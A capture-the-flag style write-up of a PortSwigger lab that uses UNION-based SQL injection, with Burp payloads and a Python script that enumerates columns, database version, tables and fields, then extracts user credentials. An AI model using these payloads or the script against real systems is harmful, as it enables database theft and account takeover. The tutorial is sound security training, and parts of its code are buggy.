+++
title = "SQLi Vulnerabilities: Lab 8: SQL injection attack, listing the database contents on non-Oracle databases"
date = 2025-11-14
lastmod = 2025-11-14
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up using a UNION Attack to enumerate & extract data from SQL databases using python and burpsuite" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "python",
  "UNION"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 8: SQL injection attack, listing the database contents on non-Oracle databases: {#lab-8-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases}

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>
> To solve the lab, log in as the `administrator` user.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a "Home" &amp; "My Account" section, the latter we can use to login.

{{< figure src="/ox-hugo/2025-11-14_15-17.png" >}}

We already know the "category" parameter is vulnerable based on the previous lab however let's re-verify this.


### Establishing SQLi: {#establishing-sqli}

If we send request to repeater we can inject a single quote `'` after the parameter and see we trigger a `500` response.
![](/ox-hugo/2025-11-14_11-22.png)

If then add a single another quote we can see that the page returns a `200` OK response.
![](/ox-hugo/2025-11-14_11-22_1.png)


### Inferring The SQL Query Being Run: {#inferring-the-sql-query-being-run}

Looking at the way the page we can infer the query being run is similar to the below.

```sql
SELECT * FROM products WHERE category = 'Pets' AND [rest of query]
```

When we add our single quote it becomes the below which is syntactically incorrect.

```sql
SELECT * FROM products WHERE category = 'Pets'' AND [rest of query]
```

However when we add another quote it becomes the below, closing off the first quotation mark we provided.

```sql
SELECT * FROM products WHERE category = 'Pets''' AND [rest of query]
```


### UNION SELECT Requirements: {#union-select-requirements}

As the lab wants us to display data we will need a way to output that data and the simplest way to retrieve data would be using a `UNION SELECT` query. This will allow us to display the output of our query's amongst the legitimate data. However in order for us to do this we need to ensure that the two requirements for this attack are met:

1.  **The queries must return the same amount of columns**:
    This means that if the original query that is searching the database returns 5 columns our `UNION` query must also return 5 columns.
    -   **To solve this issue**: We will enumerate the number of columns being returned by the original query.

2.  **The data types in the columns must be compatible with each query**:
    This means that if the table is returning strings such as item names in column 1 our `UNION` query has to also return strings or a compatible data type.
    -   **To solve this issue**: Initially we will use a simple method of returning `NULL` values. This is because `NULL` is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns &amp; eventually extract data.


### Establishing The Number Of Columns Using UNION SELECT Statement: {#establishing-the-number-of-columns-using-union-select-statement}


#### Using Burp: {#using-burp}

In order for us to display data we need to establish how many columns are in the existing database.

If we return back to repeater we can enter the payload.

```sql
' UNION SELECT NULL--
```

{{< figure src="/ox-hugo/2025-11-14_11-26.png" >}}

We then select the payload &amp; press `CTRL+U` to URL encode it, however this won't work. The reason being is that this is database is running MySQL and MySQL comments +require+ a space after the comment symbol. So we need to add an additional space so by using a `+` symbol or we can just use the `#` symbol instead.
![](/ox-hugo/2025-11-14_12-09.png)

If we send this payload we get a `500` response meaning the number of columns is not correct, so add another `NULL` so our payload and repeat the process.

```sql
' UNION SELECT NULL,NULL--
```

This time we get a `200` response telling us there are 2 columns in the table.
![](/ox-hugo/2025-11-14_12-11.png)


#### Using Python: {#using-python}

As usual I am going to show how this can also be solved using Python.


##### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


##### Imports: {#imports}

First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show.

```python
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


##### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


##### Variable Declaration: {#variable-declaration}

<!--list-separator-->

-  Proxies &amp; URL:

    We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.
    +Note+: The category and URL vary from instance to instance.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0a1c00bc04d88495826a8ad7007a0000.web-security-academy.net/filter?category=Pets"
    ```

<!--list-separator-->

-  SQL Syntax &amp; Counters:

    So now we have our payload broken up into various elements, the reason for this is because we don't want to just supply a list of multiple `UNION SELECT` statements, doing it this way offers more flexibility as well as ensuring we don't repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn't advise that but you could)

    ```python
    union="' UNION SELECT "
    comma=","
    nullPayload="NULL"
    comment="-- "
    additionalNull=comma+nullPayload
    payload=union+nullPayload
    counter=2
    ```

    We also create a `counter` variable and set it to `2`. This `counter` is used to track how many `NULL` values (columns) are in our `UNION SELECT` payload as we build it. Our starting payload is:

    ```python
    payload = union + nullPayload # "' UNION SELECT NULL"
    ```

    So before the loop runs we already have one `NULL` in the query. Inside the loop, we keep appending more `,NULL` values to `payload` and update `counter` to reflect the number of columns.

    We don’t start the `counter` at `0` because SQL columns are conceptually counted from 1 (first column, second column etc&#x2026;) and our payload already includes the first `NULL` column. If we started from 0, the value of `counter` would always lag behind the actual number of `NULL` columns in the query. By starting at `2`, the value of `counter` stays aligned with the true column count once we begin adding additional `NULL` values in the loop.


##### For Loop With Request: {#for-loop-with-request}

We declare a for loop will which repeat for 10 total iterations.

Then we have a `try` block which will send our get request to the `url` with `payload` &amp; `comment`.

**Response Monitoring**: We then monitor the responses and if the value "Home" is found in the body of the response we will:

-   Print the string `"Valid payload {payload}-- there are {counter} columns."` which will contain the actual payload as well as the number of columns.
-   Print the full Lab URL including comment and payload so we can easily verify it in a browser.

If these above conditions are met it will `break` out of the loop and stop the process.

If the above is not found it will add an additional `NULL` value using the `additionalNull` variable to the payload &amp; increment the `counter` by `1` and continue.

```python
for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
           break
        payload=payload+additionalNull
        counter+=i
```


##### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
import urllib.parse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url="https://0a1c00bc04d88495826a8ad7007a0000.web-security-academy.net/filter?category=Pets"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="-- "
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Running The Script: {#running-the-script}

As we can see it tells what we expect, there are 2 columns and the correction payload is:

```sql
' UNION SELECT NULL,NULL--
```

{{< figure src="/ox-hugo/2025-11-14_15-27.png" >}}


### Establishing Column Data Type VIA UNION SELECT Statement: {#establishing-column-data-type-via-union-select-statement}


#### Using Burp: {#using-burp}

Much like how we established the number of columns we can use repeater to determine the column data type.

We know to pass the lab we need to extract the administrators username &amp; password in a single column, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the `NULL` values of our payload with the string values `'a'`. This means our payload becomes:

```sql
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
'+UNION+SELECT+'a','a'--
```

As we can the first column is compatible with the string datatype as we get a `200` response.
![](/ox-hugo/2025-11-14_15-28.png)

We now modify our payload so the string value is in the second `NULL` position and revert the first position to be `NULL` again.

```sql
'+UNION+SELECT+NULL,'a'--
```

We can see this worked and the second position is also compatible with the string datatype.
![](/ox-hugo/2025-11-14_12-33.png)


#### Using Python: {#using-python}

We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.

```diff
+compatible=0

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
+          payloadList=[nullPayload] * counter
+          for y in range(len(payloadList)):
+              if payloadList[y] == "NULL":
+                  payloadList[y] = "'string'"
+                  newPayload=(",".join(payloadList))
+                  request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
+                  if 'Home' in request.text:
+                      print(f"Compatible data type found {union+newPayload+comment}")
+                      compatible+=1
+                      if compatible > 1:
+                          print(f"{compatible} compatible data type columns found, suggest combining payloads")
+                  payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i
```

**Compatible Variable**:
This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of `0`.

```python
compatible=0
```

**List Creation**:
We then create a `payloadList` that's contents is the value of `nullPayload` (which is "NULL") and this is equal to the value of the counter so if the counter is 2 then the list value is `['NULL', 'NULL']`

```python
payloadList=[nullPayload] * counter
```

**List Iteration**:

```python
if payloadList[y] == "NULL":
   payloadList[y] = "'string'"
```

We now iterate through the length of the list and if the value of `y` in the list is equal to `NULL` (which it will be) we replace that with the with a string called string. So on the first run it would `['string', NULL]`.

**New Payload Creation**:

```python
newPayload=(",".join(payloadList))
```

We then join our list together into a string so we can pass this to our request later, and we ensure we separate  with a comma `,` other wise our payload would be `"'string'NULLNULL"`

**Send our Request**:

```python
request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
if 'Home' in request.text:
    print(f"Compatible data type found {union+newPayload+comment}")
```

Next we send our request like before but this time we are using our new payload. We also need to ensure we send the `"union"` variable as this is not currently present in our list/string/payloadstring.

We also perform the same type of check in the body of the request for the string "Home" which will signify that we have had a `200` OK response, and in this event it will print out the payload.

**Compatible Logic Counter**:
If the above conditions are met we increment our compatible counter by `1`. We then perform a check if the counter is greater than `1` and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.

```python
compatible+=1
if compatible > 1:
    print(f"{compatible} compatible data type columns found, suggest combining payloads")
```

**Reset The `NULL` Value**:

```python
payloadList[y] = "NULL"
```

In the event that we do not get a `200` response we rest the list position `y` to be `NULL` again as other wise the list would just be full of the lab string.

As we can see when we run the script it prints out the compatible data type fields in position 1 &amp; 2 and also suggests we combine the payloads as they are both valid.
![](/ox-hugo/2025-11-14_15-30.png)


### Enumerating The Database Type By Using VIA UNION SELECT Statement: {#enumerating-the-database-type-by-using-via-union-select-statement}

In order for us to enumerate the tables we need to enumerate what type of database is currently in use.

We can easily query the database type by using any of the below payloads:

```sql
--Oracle Pyaloads
' UNION SELECT NULL,SELECT banner FROM v$version--
' UNION SELECT NULL,version FROM v$instance--
--Microsoft Payloads
' UNION SELECT NULL,SELECT @@version--
--PostgreSQL Payload
' UNION SELECT NULL,version()--
--MySQL Payload
' UNION SELECT NULL,@@version--
```


#### Using Burp: {#using-burp}

As we can see this database is a PostgreSQL database as the payload `' UNION SELECT NULL,version()--` is valid.
![](/ox-hugo/2025-11-14_15-38.png)


#### Using Python: {#using-python}

We can also add a function to our script to check for the version.

```python
def extractSQLVersion():
    sqlVersionPayload=["' UNION SELECT NULL,SELECT banner FROM v$version--",
                       "' UNION SELECT NULL,version FROM v$instance-- ",
                       "' UNION SELECT NULL,SELECT @@version-- ",
                       "' UNION SELECT NULL,version()--",
                       ]
    for versionPayload in sqlVersionPayload:
        request=requests.get(url + versionPayload, proxies=proxies, verify=False, timeout=3)
        if "Home" in request.text:
            print("-"*10)
            print(f"200 Response for payload: {versionPayload}")
            if versionPayload == sqlVersionPayload[0] or versionPayload == sqlVersionPayload[1]:
                print ("Database is an Oracle Database")
            if versionPayload == sqlVersionPayload[2]:
                print("Database is a MySQL or MSSQL Database")
            else:
                print("Database is a PostgreSQL Database")
    return False
```


##### Define Our Function: {#define-our-function}

First we define our function.

```python
def extractSQLVersion():
```


##### Define Our Version Enumeration Payloads: {#define-our-version-enumeration-payloads}

We then need to provide a list containing our payloads.

```python
    sqlVersionPayload=["' UNION SELECT NULL,SELECT banner FROM v$version--",
                       "' UNION SELECT NULL,version FROM v$instance-- ",
                       "' UNION SELECT NULL,SELECT @@version-- ",
                       "' UNION SELECT NULL,version()--",
                       ]
```


##### Iterate Through Payloads &amp; Send Requests: {#iterate-through-payloads-and-send-requests}

Now we iterate through our list of payloads and send these with our request.

```python
    for versionPayload in sqlVersionPayload:
        request=requests.get(url + versionPayload, proxies=proxies, verify=False, timeout=3)
```


##### Parse Response &amp; Return Valid Payloads: {#parse-response-and-return-valid-payloads}

We parse the response of the request for the `home` keyword as this is present on all pages signifying a `200` response. We then print out the payload and then check the payload position against our list so we can return the SQL database type to the user.

```python
        if "Home" in request.text:
            print("-"*10)
            print(f"200 Response for payload: {versionPayload}")
            if versionPayload == sqlVersionPayload[0] or versionPayload == sqlVersionPayload[1]:
                print ("Database is an Oracle Database")
            if versionPayload == sqlVersionPayload[2]:
                print("Database is a MySQL or MSSQL Database")
            else:
                print("Database is a PostgreSQL Database")
```


##### Integrate Into Existing Script: {#integrate-into-existing-script}

We now trigger it to run if a compatible column data type is found.

```diff

  if 'Home' in request.text:
      print(f"Compatible data type found {union+newPayload+comment}")
      compatible+=1
+      if compatible > 1:
          print(f"{compatible} compatible data type columns found, suggest combining payloads")
+         extractSQLVersion()
  payloadList[y] = "NULL"
```

As we can see it works and we are informed it's a PostgreSQL database.
![](/ox-hugo/2025-11-14_16-07.png)


### Enumerating Table Names VIA UNION SELECT Statement: {#enumerating-table-names-via-union-select-statement}


#### Using Burp: {#using-burp}

As we can see we can pull the table by querying the information schema.

```sql
' UNION SELECT NULL, table_name FROM information_schema.tables--
```

{{< figure src="/ox-hugo/2025-11-14_16-22.png" >}}


#### Using Python: {#using-python}

We can add the below function to check the table names.

```python
def extractSQLTableNames():
    sqlPayload="' UNION SELECT NULL, table_name FROM information_schema.tables--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "user" in response or "password" in response:
       soup = BeautifulSoup(request.text, 'html.parser')
       usersTable = soup.find(string=re.compile(r'^users'))
       passwordTable = soup.find(string=re.compile(r'^pass'))
       print("-"*10)
       print(f"The users table is called {usersTable}.")
    return usersTable
```


##### Define Our Function: {#define-our-function}

First we define our function.

```python
def extractSQLTableNames():
```


##### Define Our Version Payload: {#define-our-version-payload}

We then need to provide a ourpayload.

```python
    sqlPayload="' UNION SELECT NULL, table_name FROM information_schema.tables--"
```


##### Send Our Request: {#send-our-request}

We are only sending one request here. We also return the response in text so it's easier to parse.

```python
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.txt
```


##### Parse Response &amp; Return Valid Payloads: {#parse-response-and-return-valid-payloads}

We parse the response of the request for the "user" keyword as this will signify that the table name is present on the page.

We then extract the users table name using a regular expression and print it to the console.

```python
    if "user" in response:
       soup = BeautifulSoup(request.text, 'html.parser')
       usersTable = soup.find(string=re.compile(r'^users'))
       print("-"*10)
       print(f"The users table is called {usersTable}.")
```


##### Return usersTable Value: {#return-userstable-value}

We will need this value later in order to progress the script so let's return it now.

```python

    return usersTable
```


##### Integrate Into Existing Script: {#integrate-into-existing-script}

We now trigger it to run after our previous function call.

```diff

  if 'Home' in request.text:
      print(f"Compatible data type found {union+newPayload+comment}")
      compatible+=1
      if compatible > 1:
          print(f"{compatible} compatible data type columns found, suggest combining payloads")
          extractSQLVersion()
+         usersTable = extractSQLTableNames()
  payloadList[y] = "NULL"
```

As we can see it works:
![](/ox-hugo/2025-11-14_17-27.png)


### Enumerating Column Names VIA UNION SELECT Statement: {#enumerating-column-names-via-union-select-statement}

Now that we have the table name we need to extract the column names so we can pull data.


#### Using Burp: {#using-burp}

Using burp we can use the below UNION SELECT query to do so.

```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_tisklo'--
```

{{< figure src="/ox-hugo/2025-11-14_16-24.png" >}}

We can see there are two columns in the table `password_wnpado` &amp; `username_ktucxg`.


#### Using Python: {#using-python}

We do this using the below function in python.

```python
def extractSQLColumnNames(usersTable):
    sqlPayload=f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='{usersTable}'--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "user" in response or "password" in response:
       soup = BeautifulSoup(request.text, 'html.parser')
       usersColumn = soup.find(string=re.compile(r'username'))
       passwordColumn = soup.find(string=re.compile(r'^pass'))
       print(f"The users column is called {usersColumn} & the password table is called {passwordColumn}")
    return(usersColumn,passwordColumn)
```


##### Define Our Function: {#define-our-function}

First we define our function with one argument, the `usersTable` value we extracted earlier.

```python
def extractSQLColumnNames(usersTable):
```


##### Define Our Version Payload: {#define-our-version-payload}

We then need to provide a ourpayload which includes the `usersTable` value.

```python
    sqlPayload=f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='{usersTable}'--"
```


##### Send Our Request: {#send-our-request}

We are only sending one request here. We also return the response in text so it's easier to parse.

```python
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
```


##### Parse Response &amp; Return Valid Payloads: {#parse-response-and-return-valid-payloads}

We parse the response of the request for the "user" or "password" keywords as this will signify that the column names are present on the page.

We then extract the user &amp; columns name's using a regular expression and print it to the console.

```python
    if "user" in response or "password" in response:
       soup = BeautifulSoup(request.text, 'html.parser')
       usersColumn = soup.find(string=re.compile(r'username'))
       passwordColumn = soup.find(string=re.compile(r'^pass'))
       print("-"*10)
       print(f"The users column is called {usersColumn} & the password table is called {passwordColumn}")
```


##### Return Values: {#return-values}

Again we will need these returned values for future use.

```python
    return(usersColumn,passwordColumn)
```


##### Integrate Into Existing Script: {#integrate-into-existing-script}

We now trigger it to run after our previous function call.

```diff

  if 'Home' in request.text:
      print(f"Compatible data type found {union+newPayload+comment}")
      compatible+=1
      if compatible > 1:
          print(f"{compatible} compatible data type columns found, suggest combining payloads")
          extractSQLVersion()
          usersTable = extractSQLTableNames()
+         usersColumn, passwordColumn = extractSQLColumnNames(usersTable)
  payloadList[y] = "NULL"
```

As we can see it works:
![](/ox-hugo/2025-11-14_17-34.png)


### Extracting Data From The Table VIA UNION SELECT Statement: {#extracting-data-from-the-table-via-union-select-statement}

Now we know the names of the columns we can extract data.


#### Using Burp: {#using-burp}

```sql
' UNION SELECT NULL, username_ktucxg||':'||password_wnpado FROM users_tisklo--
```

{{< figure src="/ox-hugo/2025-11-14_16-31.png" >}}

We have the administrator username and password so we can login and solve the lab.
![](/ox-hugo/2025-11-14_16-32.png)
![](/ox-hugo/2025-11-14_16-32_1.png)


#### Using Python: {#using-python}

We can extract the administrator password using python also.

```python
def extractSQLusers(usersColumn,passwordColumn,usersTable):
    sqlPayload=f"' UNION SELECT NULL, {usersColumn}||':'||{passwordColumn} FROM {usersTable}--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "administrator" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        administratorPass = soup.find(string=re.compile(r'^administrator:'))
        print("-"*10)
        print(f"[+]: The administrator credentials are: {administratorPass}")
        return True
```


##### Define Our Function: {#define-our-function}

First we define our function with three arguments, as we need to pass the `usersColumn,passwordColumn,usersTable` values.

```python
def extractSQLusers(usersColumn,passwordColumn,usersTable):
```


##### Define Our Version Payload: {#define-our-version-payload}

We then need to provide a ourpayload which includes the `usersTable` &amp; the `usersColumn` &amp; `passwordColumn` values.

```python
    sqlPayload=f"' UNION SELECT NULL, {usersColumn}||':'||{passwordColumn} FROM {usersTable}--"
```


##### Send Our Request: {#send-our-request}

We are only sending one request here. We also return the response in text so it's easier to parse.

```python
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
```


##### Parse Response &amp; Return Valid Payloads: {#parse-response-and-return-valid-payloads}

We parse the response of the request for the "administrator" keyword as this will signify that the credentials are present.

We then extract the this value and print it to the console.

```python
    if "administrator" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        administratorPass = soup.find(string=re.compile(r'^administrator:'))
        print("-"*10)
        print(f"[+]: The administrator credentials are: {administratorPass}")
        return True
```


##### Integrate Into Existing Script: {#integrate-into-existing-script}

We now trigger it to run after our previous function call.

```diff

  if 'Home' in request.text:
      print(f"Compatible data type found {union+newPayload+comment}")
      compatible+=1
      if compatible > 1:
          print(f"{compatible} compatible data type columns found, suggest combining payloads")
          extractSQLVersion()
          usersTable = extractSQLTableNames()
          usersColumn, passwordColumn = extractSQLColumnNames(usersTable)
+         extractUsers = extractSQLusers(usersColumn, passwordColumn, usersTable)
  payloadList[y] = "NULL"
```

As we can see it works:
![](/ox-hugo/2025-11-14_17-39.png)

We have the administrator username and password so we can login and solve the lab.
![](/ox-hugo/2025-11-14_16-32.png)
![](/ox-hugo/2025-11-14_16-32_1.png)

##### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
import urllib.parse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url="https://0ab300fc03dd9d51808ee9e5003c002f.web-security-academy.net/filter?category=Gifts"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="--"
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2
compatible=0
#usersTable=""

def extractSQLVersion():
    sqlVersionPayload=["' UNION SELECT NULL,SELECT banner FROM v$version--",
                       "' UNION SELECT NULL,version FROM v$instance-- ",
                       "' UNION SELECT NULL,SELECT @@version-- ",
                       "' UNION SELECT NULL,version()--",
                       ]
    for versionPayload in sqlVersionPayload:
        request=requests.get(url + versionPayload, proxies=proxies, verify=False, timeout=3)
        if "Home" in request.text:
            print("-"*10)
            print(f"200 Response for payload: {versionPayload}")
            if versionPayload == sqlVersionPayload[0] or versionPayload == sqlVersionPayload[1]:
                print ("Database is an Oracle Database")
            if versionPayload == sqlVersionPayload[2]:
                print("Database is a MySQL or MSSQL Database")
            else:
                print("Database is a PostgreSQL Database")
    return False

def extractSQLTableNames():
    sqlPayload="' UNION SELECT NULL, table_name FROM information_schema.tables--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "user" in response: 
       soup = BeautifulSoup(request.text, 'html.parser')
       usersTable = soup.find(string=re.compile(r'^users'))
       print("-"*10)
       print(f"The users table is called {usersTable}.")
    return usersTable

def extractSQLColumnNames(usersTable):
    sqlPayload=f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='{usersTable}'--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "user" in response or "password" in response: 
       soup = BeautifulSoup(request.text, 'html.parser')
       usersColumn = soup.find(string=re.compile(r'username'))
       passwordColumn = soup.find(string=re.compile(r'^pass'))
       print("-"*10)
       print(f"The users column is called {usersColumn} & the password table is called {passwordColumn}")
    return(usersColumn,passwordColumn)


def extractSQLusers(usersColumn,passwordColumn,usersTable):
    sqlPayload=f"' UNION SELECT NULL, {usersColumn}||':'||{passwordColumn} FROM {usersTable}--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "administrator" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        administratorPass = soup.find(string=re.compile(r'^administrator:'))
        print("-"*10)
        print(f"[+]: The administrator credentials are: {administratorPass}")
        return True

for i in range(10):
    try: 
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'Home' in request.text:
           print("-"*10)
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("-"*10)
           payloadList=[nullPayload] * counter
           for y in range(len(payloadList)):
               if payloadList[y] == "NULL":
                   payloadList[y] = "'string'"
                   newPayload=(",".join(payloadList))
                   request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
                   if 'Home' in request.text:
                       print(f"Compatible data type found {union+newPayload+comment}")
                       compatible+=1
                       if compatible > 1:
                           print(f"{compatible} compatible data type columns found, suggest combining payloads")
                           extractSQLVersion()
                           usersTable = extractSQLTableNames()
                           usersColumn, passwordColumn = extractSQLColumnNames(usersTable)
                           extractUsers = extractSQLusers(usersColumn, passwordColumn, usersTable)
                   payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)



```
